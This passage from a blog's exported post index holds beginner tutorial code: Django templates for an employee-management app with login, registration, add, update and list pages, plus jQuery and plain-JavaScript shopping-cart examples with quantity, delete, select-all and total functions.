id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; Welcome! &lt;/h1&gt; &lt;table class=&quot;table&quot;&gt; &lt;tr class=&quot;table_header&quot;&gt; &lt;td&gt; ID &lt;/td&gt; &lt;td&gt; Name &lt;/td&gt; &lt;td&gt; Salary &lt;/td&gt; &lt;td&gt; Age &lt;/td&gt; &lt;td&gt; Operation &lt;/td&gt; &lt;/tr&gt; &#123;% for i in staff %&#125; &#123;% if forloop.counter|divisibleby:2 %&#125; &lt;tr class=&quot;row1&quot; style=&quot;background-color: #ffffff&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;work:delete_logic&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;&#123;% url &quot;work:updateemp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% else %&#125; &lt;tr class=&quot;row2&quot; style=&quot;background-color: #eeeeee&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;work:delete_logic&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;&#123;% url &quot;work:updateemp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;button&quot; class=&quot;button&quot; value=&quot;Add Employee&quot; onclick=&quot;location=&#x27;&#123;% url &quot;work:addemp&quot; %&#125;&#x27;&quot;/&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; login.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;login&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br /&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; login &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;work:login_logic&quot; %&#125;&quot; method=&quot;post&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; username: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; password: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;password&quot; class=&quot;inputgri&quot; name=&quot;pwd&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Submit &amp;raquo;&quot; /&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; register.html12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;regist&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br /&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; 注册 &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;work:regist_logic&quot; %&#125;&quot; method=&quot;post&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 用户名: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;username&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 真实姓名: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 密码: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;password&quot; class=&quot;inputgri&quot; name=&quot;pwd&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 性别: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; 男 &lt;input type=&quot;radio&quot; class=&quot;inputgri&quot; name=&quot;sex&quot; value=&quot;m&quot; checked=&quot;checked&quot;/&gt; 女 &lt;input type=&quot;radio&quot; class=&quot;inputgri&quot; name=&quot;sex&quot; value=&quot;f&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt;&#123;# &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt;#&#125;&#123;# 验证码:#&#125;&#123;# &lt;img id=&quot;num&quot; src=&quot;image&quot; /&gt;#&#125;&#123;# &lt;a href=&quot;javascript:;&quot; onclick=&quot;document.getElementById(&#x27;num&#x27;).src = &#x27;image?&#x27;+(new Date()).getTime()&quot;&gt;换一张&lt;/a&gt;#&#125;&#123;# &lt;/td&gt;#&#125; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;number&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Submit &amp;raquo;&quot; /&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; updateEmp.html12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;update Emp&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br /&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;Main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; update Emp info: &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;work:updateemp_logic&quot; %&#125;?id=&#123;&#123; staff.id &#125;&#125;&quot; method=&quot;post&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; id: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot; &gt; &#123;&#123; staff.id&#125;&#125; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; name: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; value=&quot;&#123;&#123; staff.name &#125;&#125;&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; salary: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;salary&quot; value=&quot;&#123;&#123; staff.salary &#125;&#125;&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; age: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;age&quot; value=&quot;&#123;&#123; staff.age &#125;&#125;&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Confirm&quot; /&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; addEmp.html1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;add Emp&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br /&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;Main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; add Emp info: &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;work:addemp_logic&quot; %&#125;&quot; method=&quot;post&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; name: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; salary: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;salary&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; age: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;age&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Confirm&quot; /&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt;","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"http://example.com/tags/Django/"}]},{"title":"jQuery-实现简易购物车","slug":"jQuery-实现简易购物车","date":"2020-08-16T00:43:02.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/08/16/jQuery-实现简易购物车/","permalink":"http://example.com/2020/08/16/jQuery-%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93%E8%B4%AD%E7%89%A9%E8%BD%A6/","excerpt":"实现简易购物车,删除,全选,合计","text":"实现简易购物车,删除,全选,合计 jQery实现简易购物车实现效果图 HTML代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;购物车&lt;/title&gt; &lt;script src=&quot;jquery-1.11.1.js&quot;&gt;&lt;/script&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;my_css.css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;box&quot;&gt; &lt;table id=&quot;t&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th width=&quot;100px&quot;&gt;&lt;label&gt; &lt;input type=&quot;checkbox&quot; class=&quot;check_all_check&quot;&gt; 全选&lt;/label&gt;&lt;/th&gt; &lt;th&gt;商品&lt;/th&gt; &lt;th width=&quot;100px&quot;&gt;单价&lt;/th&gt; &lt;th&gt;数量&lt;/th&gt; &lt;th width=&quot;100px&quot;&gt;小计&lt;/th&gt; &lt;th width=&quot;100px&quot;&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tr&gt; &lt;td class=&quot;checkbox&quot;&gt;&lt;input type=&quot;checkbox&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;1.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Casio/卡西欧 EX-TR350&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;5999.88&lt;/td&gt; &lt;td class=&quot;count&quot;&gt;&lt;span class=&quot;reduce&quot;&gt;&lt;/span&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;5999.88&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class=&quot;checkbox&quot;&gt;&lt;input type=&quot;checkbox&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;2.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Canon/佳能 PowerShot SX50 HS&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;3888.50&lt;/td&gt; &lt;td class=&quot;count&quot;&gt;&lt;span class=&quot;reduce&quot;&gt;&lt;/span&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;3888.50&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class=&quot;checkbox&quot;&gt;&lt;input type=&quot;checkbox&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;3.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Sony/索尼 DSC-WX300&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;1428.50&lt;/td&gt; &lt;td class=&quot;count&quot;&gt;&lt;span class=&quot;reduce&quot;&gt;&lt;/span&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;1428.50&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class=&quot;checkbox&quot;&gt;&lt;input type=&quot;checkbox&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;4.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Fujifilm/富士 instax mini 25&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;640.60&lt;/td&gt; &lt;td class=&quot;count&quot;&gt;&lt;span class=&quot;reduce&quot;&gt;&lt;/span&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;640.60&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan=&quot;5&quot;&gt; &lt;div id=&quot;foot&quot;&gt; &lt;label&gt;&lt;input type=&quot;checkbox&quot; class=&quot;check_all_check&quot;&gt; 全选&lt;/label&gt; &lt;a id=&quot;deleteAll&quot; href=&quot;javascript:void(0)&quot;&gt;删除&lt;/a&gt; &lt;/div&gt; &lt;div id=&quot;selected&quot;&gt;已选商品&lt;span id=&quot;selectedTotal&quot;&gt;0&lt;/span&gt;件&lt;span id=&quot;hidden&quot;&gt;︽&lt;/span&gt;&lt;/div&gt; &lt;div&gt;合计：￥&lt;span id=&quot;priceTotal&quot;&gt;0&lt;/span&gt;&lt;/div&gt; &lt;/td&gt; &lt;td&gt; &lt;div onclick=&quot;getTotal();&quot;&gt;结 算&lt;/div&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/div&gt;&lt;script src=&quot;my_js.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263table &#123; margin: 0 auto; border: 1px #CADEFF solid; text-align: center; border-spacing: 0;&#125;a &#123; color: #666; text-decoration: none;&#125;th &#123; background: #e2f2ff;&#125;td &#123; text-align: center; padding: 10px; color: #444;&#125;#box table th, #box table td &#123; border: 1px solid #CADEFF; border-spacing: 0;&#125;.goods span &#123; width: 180px; margin-top: 30px; text-align: left; float: left;&#125;img &#123; width: 100px; height: 80px; margin-right: 10px; float: left;&#125;#foot &#123; float: left; margin-right: 300px;&#125;#selected &#123; float: left;&#125;.count .add, .count .reduce &#123; height: 25px; width: 17px; background: #f0f0f0; text-align: center; line-height: 25px; color: #444;&#125;.count input &#123; height: 25px; line-height: 25px; border: 1px solid #aaa; color: #343434; text-align: center; background-color: #fff;&#125;.price &#123; width: 130px;&#125;.count &#123; width: 90px;&#125; 基于jQuery的js12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879//实现小计功能$(&quot;.reduce&quot;).click(function () &#123; var count1 = $(this).next().val(); var count2 = Number(count1) - 1; //修改后的数量 if (count2 === 0) &#123; $(this).attr(&#x27;disabled&#x27;, &#x27;disabled&#x27;); alert(&quot;商品个数不能为0&quot;); $(this).parent().parent().remove(); &#125; $(this).next().val(count2); // 修改数量 var price = Number($(this).parent().prev().text()); //获取单个价格 var subtatal = Number($(this).parent().next().text()); //获取原始的默认价格 var subtatal1 = count2 * price; //计算后的价格 $(this).parent().next().text(subtatal1.toFixed(2));//修改价格 getP()&#125;);$(&quot;.add&quot;).click(function () &#123; var count1 = $(this).prev().val(); var count2 = Number(count1) + 1; //修改后的数量 $(this).prev().val(count2); //修改数量 var price = Number($(this).parent().prev().text()); //获取单个价格 var subtatal = Number($(this).parent().next().text()); //获取原始的默认价格 var subtatal1 = count2 * price; //计算后的价格 $(this).parent().next().text(subtatal1.toFixed(2)); //修改价格 getP()&#125;);//实现删除功能$(&quot;.delete&quot;).click(function () &#123; $(this).parent().parent().remove(); getP()&#125;);// 全选或不选$(&quot;.check_all_check&quot;).click(function () &#123; var checked = $(&quot;.checkbox&gt;input&quot;); //获取所有的物品选择框 console.log(checked); var sum = checked.size(); //记录选择框的大小 var attr1 = $(this).prop(&#x27;checked&#x27;); //获取全选框的属性 checked.prop(&#x27;checked&#x27;, attr1); getP()&#125;);//单选$(&quot;.checkbox&quot;).click(function () &#123; getP()&#125;);//选择删除功能$(&quot;#deleteAll&quot;).click(function () &#123; //选出已选择的需要删除的行 //遍历购物车的物品行数 var plist = $(&quot;.checkbox&gt;input&quot;); //获取购物车中的选择框 for (var i = 0; i &lt; plist.size(); i++) &#123; if ($(plist[i]).is(&quot;:checked&quot;)) &#123; $($(plist[i]).parent().parent()).remove() //被选择的执行删除整行 &#125; &#125; getP()&#125;);//遍历 计算总价与小计function getP() &#123; var plist = $(&quot;.checkbox&gt;input&quot;); //获取chekbox的选择框,用来遍历 var count = 0; //已选择数量 var number = 0; //合计价格 for (var i = 0; i &lt; plist.size(); i++) &#123; // console.log($(plist[i])); if ($(plist[i]).is(&quot;:checked&quot;)) &#123; //被选择 var subtotal = $($(plist[i]).parent().parent().children()[4]).text(); //获取单行的价格 var count1 = $($($(plist[i]).parent().parent().children()[3]).children(&#x27;input&#x27;)[1]).val(); //获取单行的数量 count += Number(count1); number += Number(subtotal); &#125; &#125; var selected = $(&quot;#selectedTotal&quot;); //获取已选择 // console.log(selected); selected.text(count); var priceTotal = $(&quot;#priceTotal&quot;); //获取已选择物品的价格 // console.log(priceTotal); priceTotal.text(number.toFixed(2));&#125;","categories":[],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"http://example.com/tags/jQuery/"}]},{"title":"JavaScript-实现简易购物车","slug":"JavaScript-实现简易购物车","date":"2020-08-16T00:41:59.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/08/16/JavaScript-实现简易购物车/","permalink":"http://example.com/2020/08/16/JavaScript-%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93%E8%B4%AD%E7%89%A9%E8%BD%A6/","excerpt":"实现简易购物车,删除,全选,合计","text":"实现简易购物车,删除,全选,合计 JavaScript实现简易购物车实现的效果图 HTML代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;购物车&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;my_css.css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;box&quot;&gt; &lt;table id=&quot;t&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th width=&quot;100px&quot;&gt;&lt;label&gt; &lt;input type=&quot;checkbox&quot; class=&quot;check-box&quot; onclick=&quot;check_all(this)&quot;&gt; 全选&lt;/label&gt;&lt;/th&gt; &lt;th&gt;商品&lt;/th&gt; &lt;th width=&quot;100px&quot;&gt;单价&lt;/th&gt; &lt;th&gt;数量&lt;/th&gt; &lt;th width=&quot;100px&quot;&gt;小计&lt;/th&gt; &lt;th width=&quot;100px&quot;&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tr&gt; &lt;td&gt;&lt;input class=&quot;checkbox&quot; type=&quot;checkbox&quot; onclick=&quot;check(this)&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;1.jpg&quot; alt=&quot;图片加载失败&quot;&gt;&lt;span&gt;Casio/卡西欧 EX-TR350&lt;/span&gt;&lt;/td&gt; &lt;td class=&quot;price&quot;&gt;5999.88&lt;/td&gt; &lt;td class=&quot;count&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;reduce&quot; value=&quot;-&quot; onclick=&quot;reduce(this)&quot;&gt; &lt;input class=&quot;count-input&quot; type=&quot;text&quot; value=&quot;1&quot; size=&quot;1px&quot;&gt; &lt;input type=&quot;button&quot; class=&quot;add&quot; value=&quot;+&quot; onclick=&quot;add(this)&quot;&gt; &lt;/td&gt; &lt;td class=&quot;subtotal&quot;&gt;5999.88&lt;/td&gt; &lt;td class=&quot;operation&quot;&gt;&lt;a class=&quot;delete&quot; href=&quot;javascript:void(0)&quot; onclick=&quot;delete1(this)&quot;&gt;删除&lt;/a&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input class=&quot;checkbox&quot; type=&quot;checkbox&quot; onclick=&quot;check(this)&quot;&gt;&lt;/td&gt; &lt;td class=&quot;goods&quot;&gt;&lt;img src=&quot;2.jpg&quot; 